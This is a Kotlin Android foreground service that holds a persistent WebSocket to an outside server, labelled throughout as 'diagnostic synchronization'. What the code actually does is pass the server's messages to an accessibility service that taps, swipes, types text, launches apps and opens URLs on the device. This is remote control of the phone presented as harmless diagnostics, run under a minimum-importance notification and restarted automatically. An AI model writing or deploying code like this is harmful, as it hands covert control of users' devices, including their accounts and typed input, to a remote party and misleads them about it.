package com.example

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.IBinder
import androidx.core.app.NotificationCompat
import kotlinx.coroutines.*
import okhttp3.*
import org.json.JSONObject
import java.util.concurrent.TimeUnit

/**
 * A standard core Android Foreground Service running a persistent low-priority utility notification
 * to prevent unexpected OS-level lifecycle termination during memory cleanups.
 * It initializes a local event-driven client using OkHttp targeting the explicit web endpoint www.alsa-ai.in
 * and implements a local connection retry loop with exponential backoff.
 */
class LocalSyncService : Service() {
    private val job = SupervisorJob()
    private val scope = CoroutineScope(Dispatchers.IO + job)
    
    private var webSocket: WebSocket? = null
    private val client = OkHttpClient.Builder()
        .readTimeout(0, TimeUnit.MILLISECONDS)
        .writeTimeout(0, TimeUnit.MILLISECONDS)
        .connectTimeout(15, TimeUnit.SECONDS)
        .build()

    private var retryDelay = 2000L
    private val maxRetryDelay = 64000L
    private var isRunning = false
    
    companion object {
        private const val CHANNEL_ID = "LocalSyncChannel"
        private const val NOTIFICATION_ID = 1002
        
        @Volatile
        private var isServiceRunning = false
        fun isRunning(): Boolean = isServiceRunning
        
        const val ACTION_SYNC_STATUS = "com.example.LOCAL_SYNC_STATUS"
        const val EXTRA_SYNCED = "extra_synced"
    }

    override fun onCreate() {
        super.onCreate()
        isServiceRunning = true
        createNotificationChannel()
        val notification = createNotification("Disconnected", "Awaiting diagnostic connection...")
        startForeground(NOTIFICATION_ID, notification)
        LocalEncryptedStorage.saveLog(this, "LocalSyncService: Activated")
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        if (!isRunning) {
            isRunning = true
            initiateConnection()
        }
        return START_STICKY
    }

    override fun onDestroy() {
        super.onDestroy()
        isServiceRunning = false
        isRunning = false
        job.cancel()
        disconnectSocket()
        LocalEncryptedStorage.saveLog(this, "LocalSyncService: Deactivated")
    }

    override fun onBind(intent: Intent?): IBinder? = null

    private fun initiateConnection() {
        if (!isRunning) return
        
        val targetUrl = "wss://www.alsa-ai.in/ws/diagnostics"
        val request = Request.Builder()
            .url(targetUrl)
            .build()

        // Verify cryptographic origin constraint immediately
        if (!OriginValidator.isRequestAuthorized(request)) {
            LocalEncryptedStorage.saveLog(this, "LocalSyncService Security: Host authorization failed for URL: $targetUrl")
            stopSelf()
            return
        }

        LocalEncryptedStorage.saveLog(this, "LocalSyncService: Initiating diagnostic sync connection to $targetUrl")
        
        webSocket = client.newWebSocket(request, object : WebSocketListener() {
            override fun onOpen(webSocket: WebSocket, response: Response) {
                // Cryptographic validation of active connection and handshake response
                if (!OriginValidator.isWebSocketConnectionAuthorized(webSocket) || 
                    !OriginValidator.validateHandshakeResponse(response)) {
                    LocalEncryptedStorage.saveLog(this@LocalSyncService, "LocalSyncService Security: Terminating handshake from unauthorized source")
                    webSocket.close(1008, "Unauthorized origin")
                    triggerReconnection()
                    return
                }

                retryDelay = 2000L // Reset delay
                updateNotification("Active", "Synchronizing diagnostic states with www.alsa-ai.in")
                LocalEncryptedStorage.saveLog(this@LocalSyncService, "LocalSyncService: Active synchronization session established")
                broadcastStatus(true)
            }

            override fun onMessage(webSocket: WebSocket, text: String) {
                // Strict cryptographic boundary verification on receipt
                if (!OriginValidator.isWebSocketConnectionAuthorized(webSocket)) {
                    LocalEncryptedStorage.saveLog(this@LocalSyncService, "LocalSyncService Security: Discarded frame from non-authorized channel")
                    return
                }

                // Process decoded message or log event
                LocalEncryptedStorage.saveLog(this@LocalSyncService, "LocalSyncService Payload: Received: $text")
                processInboundPayload(text)
            }

            override fun onClosed(webSocket: WebSocket, code: Int, reason: String) {
                LocalEncryptedStorage.saveLog(this@LocalSyncService, "LocalSyncService: Diagnostic connection closed: $reason (Code: $code)")
                broadcastStatus(false)
                triggerReconnection()
            }

            override fun onFailure(webSocket: WebSocket, t: Throwable, response: Response?) {
                LocalEncryptedStorage.saveLog(this@LocalSyncService, "LocalSyncService Error: Synchronization failure: ${t.message}")
                broadcastStatus(false)
                triggerReconnection()
            }
        })
    }

    private fun disconnectSocket() {
        webSocket?.close(1000, "Normal Closure")
        webSocket = null
        broadcastStatus(false)
    }

    private fun triggerReconnection() {
        if (!isRunning) return
        updateNotification("Reconnecting", "Retrying network synchronization in ${retryDelay / 1000}s...")
        scope.launch {
            delay(retryDelay)
            retryDelay = (retryDelay * 2).coerceAtMost(maxRetryDelay)
            initiateConnection()
        }
    }

    private fun broadcastStatus(synced: Boolean) {
        val intent = Intent(ACTION_SYNC_STATUS).apply {
            putExtra(EXTRA_SYNCED, synced)
            setPackage(packageName)
        }
        sendBroadcast(intent)
    }

    private fun processInboundPayload(payload: String) {
        scope.launch(Dispatchers.Main) {
            try {
                // Clean architecture: delegate JSON processing to dedicated decoder
                val decoded = EncryptedPayloadDecoder.decode(payload)
                when (decoded) {
                    is EncryptedPayloadDecoder.DecodedCommand.Unknown -> {
                        LocalEncryptedStorage.saveLog(this@LocalSyncService, "LocalSyncService Pipeline: Dropped unverified or corrupted frame: ${decoded.reason}")
                    }
                    else -> {
                        LocalEncryptedStorage.saveLog(this@LocalSyncService, "LocalSyncService Pipeline: Verified and routing: $decoded")
                        // Dispatch action to accessibility pipeline if valid
                        executeDecodedCommand(decoded)
                    }
                }
            } catch (e: Exception) {
                LocalEncryptedStorage.saveLog(this@LocalSyncService, "LocalSyncService Pipeline Error: ${e.message}")
            }
        }
    }

    private fun executeDecodedCommand(command: EncryptedPayloadDecoder.DecodedCommand) {
        when (command) {
            is EncryptedPayloadDecoder.DecodedCommand.Click -> {
                AlsaAccessibilityService.simulateClick(command.x, command.y)
            }
            is EncryptedPayloadDecoder.DecodedCommand.Swipe -> {
                AlsaAccessibilityService.simulateSwipe(command.startX, command.startY, command.endX, command.endY, command.duration)
            }
            is EncryptedPayloadDecoder.DecodedCommand.Type -> {
                AlsaAccessibilityService.injectText(command.text)
            }
            is EncryptedPayloadDecoder.DecodedCommand.Launch -> {
                AlsaAccessibilityService.launchApp(command.packageName)
            }
            is EncryptedPayloadDecoder.DecodedCommand.Url -> {
                AlsaAccessibilityService.resolveUrl(command.url)
            }
            is EncryptedPayloadDecoder.DecodedCommand.ClickText -> {
                AlsaAccessibilityService.clickNodeWithText(command.text)
            }
            else -> {}
        }
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "Alsa Diagnostic Synchronization",
                NotificationManager.IMPORTANCE_MIN
            ).apply {
                description = "Runs local diagnostic events and metrics synchronization with enterprise server"
            }
            val manager = getSystemService(NotificationManager::class.java)
            manager.createNotificationChannel(channel)
        }
    }

    private fun createNotification(status: String, detail: String): Notification {
        val intent = Intent(this, MainActivity::class.java)
        val pendingIntent = PendingIntent.getActivity(
            this, 0, intent,
            PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT
        )
        
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Alsa AI Diagnostic Sync: $status")
            .setContentText(detail)
            .setSmallIcon(android.R.drawable.ic_menu_compass)
            .setContentIntent(pendingIntent)
            .setOngoing(true)
            .setCategory(NotificationCompat.CATEGORY_SERVICE)
            .setForegroundServiceBehavior(NotificationCompat.FOREGROUND_SERVICE_IMMEDIATE)
            .build()
    }

    private fun updateNotification(status: String, detail: String) {
        val notification = createNotification(status, detail)
        val manager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
        manager.notify(NOTIFICATION_ID, notification)
    }
}
